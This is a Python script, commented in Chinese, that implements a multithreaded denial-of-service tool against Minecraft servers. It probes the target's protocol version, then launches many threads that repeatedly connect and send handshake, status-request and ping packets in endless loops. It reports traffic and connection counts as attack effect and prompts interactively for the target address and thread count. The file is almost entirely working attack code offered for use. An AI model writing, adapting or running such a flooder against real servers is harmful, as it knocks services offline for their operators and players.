import socket
import threading
import json
import time
from typing import Tuple, Optional, List


class MinecraftProtocol:
    MAX_VARINT_BYTES = 5
    @staticmethod
    def read_var_int(sock: socket.socket) -> int:
        i = 0
        j = 0
        while True:
            k = sock.recv(1)
            if not k:
                raise EOFError("连接已关闭")
            k = ord(k)
            i |= (k & 0x7F) << j * 7
            j += 1
            if j > MinecraftProtocol.MAX_VARINT_BYTES:
                raise RuntimeError("VarInt too big (超过5字节)")
            if (k & 0x80) == 0:
                break
        return i

    @staticmethod
    def encode_varint(value: int) -> bytes:
        """安全的VarInt编码（限制最多5字节，避免无限循环）"""
        bytes_list = []
        for _ in range(MinecraftProtocol.MAX_VARINT_BYTES):
            if (value & 0xFFFFFF80) == 0:
                bytes_list.append(value & 0xFF)
                break
            bytes_list.append((value & 0x7F) | 0x80)
            value >>= 7
        else:
            raise ValueError("VarInt过大（超过5字节限制）")
        return bytes(bytes_list)

    @staticmethod
    def create_packet(data: bytes) -> bytes:
        """创建带长度前缀的数据包（前缀为VarInt格式）"""
        length = MinecraftProtocol.encode_varint(len(data))
        return length + data

    @staticmethod
    def recv_all(sock: socket.socket, length: int) -> bytes:
        """确保接收指定长度的字节（解决部分接收问题）"""
        data = b""
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk:
                raise EOFError("连接中断，未接收完整数据")
            data += chunk
        return data


class PacketBuilder:
    """数据包构建器类"""

    def __init__(self, server_ip: str, server_port: int, protocol_version: int = -1):
        self.server_ip = server_ip
        self.server_port = server_port
        self.protocol_version = protocol_version

    def build_handshake_packet(self, next_state: int = 1) -> bytes:
        """构建握手包"""
        packet = b"\x00"  # 包ID：握手
        packet += MinecraftProtocol.encode_varint(self.protocol_version)
        packet += MinecraftProtocol.encode_varint(len(self.server_ip))
        packet += self.server_ip.encode('utf-8')
        packet += self.server_port.to_bytes(2, byteorder='big')
        packet += MinecraftProtocol.encode_varint(next_state)  # 状态：1=状态请求, 2=登录
        return packet

    def build_status_request_packet(self) -> bytes:
        """构建状态请求包"""
        return b"\x00"  # 包ID：请求服务器状态

    def build_ping_packet(self) -> bytes:
        """构建Ping包"""
        packet = b"\x01"  # 包ID：Ping
        packet += (0x7FFFFFFFFFFFFFFF).to_bytes(8, byteorder='big')
        return packet
    def build_login_start_packet(self, username: str) -> bytes:
        packet = b"\x00"
        packet += MinecraftProtocol.encode_varint(len(username))
        packet += username.encode('utf-8')
        return packet


class ConnectionManager:
    """连接管理器类"""

    def __init__(self, server_ip: str, server_port: int):
        self.server_ip = server_ip
        self.server_port = server_port
        self.packet_builder = PacketBuilder(server_ip, server_port)

    def create_connection(self, timeout: Optional[float] = None) -> socket.socket:
        """创建并连接到服务器的socket"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if timeout:
            sock.settimeout(timeout)
        sock.connect((self.server_ip, self.server_port))
        return sock

    def send_packet(self, sock: socket.socket, packet_data: bytes) -> None:
        """发送数据包"""
        packet = MinecraftProtocol.create_packet(packet_data)
        sock.send(packet)

    def receive_packet(self, sock: socket.socket) -> Tuple[int, bytes]:
        """接收数据包"""
        length = MinecraftProtocol.read_var_int(sock)
        packet_id = MinecraftProtocol.read_var_int(sock)
        remaining_length = length - len(MinecraftProtocol.encode_varint(packet_id))
        data = MinecraftProtocol.recv_all(sock, remaining_length)
        return packet_id, data


class AttackStatistics:
    """攻击统计类"""

    def __init__(self):
        self.total_data = 0
        self.failed_connections = 0
        self.successful_connections = 0
        self.lock = threading.Lock()

    def add_data(self, amount: int) -> None:
        """添加传输的数据量"""
        with self.lock:
            self.total_data += amount

    def add_failed_connection(self) -> None:
        """增加失败连接计数"""
        with self.lock:
            self.failed_connections += 1

    def add_successful_connection(self) -> None:
        """增加成功连接计数"""
        with self.lock:
            self.successful_connections += 1

    def get_formatted_data_size(self) -> str:
        """获取格式化的数据大小"""
        data = self.total_data
        if data >= 1024 * 1024 * 1024:
            return f"{data / (1024.0 * 1024.0 * 1024.0):.2f} GB"
        elif data >= 1024 * 1024:
            return f"{data / (1024.0 * 1024.0):.2f} MB"
        elif data >= 1024:
            return f"{data / 1024.0:.2f} KB"
        else:
            return f"{data} bytes"

    def get_stats(self) -> str:
        """获取统计信息字符串"""
        return (f"数据传输: {self.get_formatted_data_size()}, "
                f"成功连接: {self.successful_connections}, "
                f"失败连接: {self.failed_connections}")


class VersionDetector:
    """版本探测器类"""

    def __init__(self, connection_manager: ConnectionManager):
        self.connection_manager = connection_manager

    def detect_version(self) -> Tuple[bool, int, str]:
        """探测服务器版本"""
        try:
            with self.connection_manager.create_connection(timeout=5) as sock:
                # 构建临时握手包 - 使用原始方式编码VarInt，避免负数问题
                temp_handshake = b"\x00"  # 包ID：握手

                # 使用原始代码的方式编码版本号
                version_bytes = b"\x00"  # 版本号0的VarInt编码
                temp_handshake += version_bytes

                # 添加IP地址
                ip_len = MinecraftProtocol.encode_varint(len(self.connection_manager.server_ip))
                temp_handshake += ip_len
                temp_handshake += self.connection_manager.server_ip.encode('utf-8')

                # 添加端口
                temp_handshake += self.connection_manager.server_port.to_bytes(2, byteorder='big')

                # 添加状态
                state_bytes = MinecraftProtocol.encode_varint(1)  # 状态：1=状态请求
                temp_handshake += state_bytes

                self.connection_manager.send_packet(sock, temp_handshake)
                self.connection_manager.send_packet(sock, b"\x00")  # 状态请求包

                # 读取响应
                packet_id, response_data = self.connection_manager.receive_packet(sock)
                if packet_id == 0:  # 状态响应包
                    # 解析VarInt字符串长度
                    str_len = 0
                    bytes_consumed = 0
                    for i in range(5):  # VarInt最多5字节
                        if i >= len(response_data):
                            break
                        byte_val = response_data[i]
                        str_len |= (byte_val & 0x7F) << (7 * i)
                        bytes_consumed += 1
                        if not (byte_val & 0x80):
                            break

                    # 读取JSON字符串
                    json_str = response_data[bytes_consumed:bytes_consumed + str_len].decode('utf-8')
                    motd_json = json.loads(json_str)
                    protocol_version = motd_json["version"]["protocol"]
                    version_name = motd_json["version"]["name"]
                    return True, protocol_version, version_name
                return False, -1, ""
        except Exception as e:
            print(f"版本探测失败: {e}")
            return False, -1, ""


class AttackThread(threading.Thread):
    """攻击线程类"""

    def __init__(self, thread_id: int, connection_manager: ConnectionManager,
                 stats: AttackStatistics, packets: dict):
        super().__init__()
        self.thread_id = thread_id
        self.connection_manager = connection_manager
        self.stats = stats
        self.packets = packets
        self.daemon = True
        self.username_counter = thread_id * 1000

    def run(self):
        """执行攻击循环"""
        while True:
            try:
                self._perform_attack_cycle()
                self.stats.add_successful_connection()
            except Exception:
                self.stats.add_failed_connection()

    def _perform_attack_cycle(self):
        """执行一次完整的攻击循环"""
        # 第一次连接：握手+状态请求
        with self.connection_manager.create_connection() as sock:
            self.connection_manager.send_packet(sock, self.packets['handshake'])
            self.connection_manager.send_packet(sock, self.packets['status_request'])

            # 读取响应
            packet_id, response_data = self.connection_manager.receive_packet(sock)
            self.stats.add_data(len(response_data) + 10)

            self.connection_manager.send_packet(sock, self.packets['ping'])
            packet_id, ping_response = self.connection_manager.receive_packet(sock)
            self.stats.add_data(len(ping_response) + 10)


class MonitorThread(threading.Thread):
    def __init__(self, stats: AttackStatistics, update_interval: int = 3):
        super().__init__()
        self.stats = stats
        self.update_interval = update_interval
        self.daemon = True
    def run(self):
        while True:
            time.sleep(self.update_interval)
            print(f"\n[攻击效果] {self.stats.get_stats()}")

class MinecraftDDoSAttack:
    def __init__(self):
        self.stats = AttackStatistics()
        self.threads: List[AttackThread] = []
        self.monitor_thread: Optional[MonitorThread] = None
    def setup(self, server_ip: str, server_port: int, thread_count: int, text: str) -> bool:
        self.connection_manager = ConnectionManager(server_ip, server_port)
        detector = VersionDetector(self.connection_manager)
        success, protocol_version, version_name = detector.detect_version()
        if success:
            print(f"服务器版本: {version_name}, 协议版本号: {protocol_version}")
            self.connection_manager.packet_builder.protocol_version = protocol_version
        else:
            print("版本探测失败")
            print("常见协议版本参考: 1.18.2=758, 1.19.4=760, 1.20.1=760, 1.21=767, 1.21.8=772")
            try:
                protocol_version = int(input("请手动输入协议版本号: "))
                self.connection_manager.packet_builder.protocol_version = protocol_version
            except ValueError:
                print("无效的协议版本号")
                return False
        self.packets = {
            'handshake': self.connection_manager.packet_builder.build_handshake_packet(next_state=1),
            'status_request': self.connection_manager.packet_builder.build_status_request_packet(),
            'ping': self.connection_manager.packet_builder.build_ping_packet(),
            'login_handshake': self.connection_manager.packet_builder.build_handshake_packet(next_state=2)
        }
        self.thread_count = thread_count
        self.text = text
        return True
    def start_attack(self):
        self.monitor_thread = MonitorThread(self.stats)
        self.monitor_thread.start()
        for i in range(self.thread_count):
            thread = AttackThread(i, self.connection_manager, self.stats, self.packets)
            thread.start()
            self.threads.append(thread)
            time.sleep(0.01)
    def run(self):
        try:
            while True:
                time.sleep(1)
                print(f"\r当前状态: {self.stats.get_stats()}", end="", flush=True)
        except KeyboardInterrupt:
            print("\n\n攻击已停止")
            print(f"最终统计: {self.stats.get_stats()}")
    def stop(self):
        print("攻击停止中...")



if __name__ == "__main__":
    attack = MinecraftDDoSAttack()
    ip_input = input("请输入服务器地址(格式:IP:端口，如127.0.0.1:25565): ")
    thread_num = int(input("请输入线程数量(建议从100开始测试): "))
    text = input("请输入干扰字符(英文/数字，不要太长): ")
    parts = ip_input.split(":")
    if len(parts) != 2:
        print("地址格式错误！必须包含端口(如127.0.0.1:25565)")
        exit(1)
    server_ip = parts[0]
    server_port = int(parts[1])
    if not attack.setup(server_ip, server_port, thread_num, text):
        exit(1)
    attack.start_attack()
    attack.run()
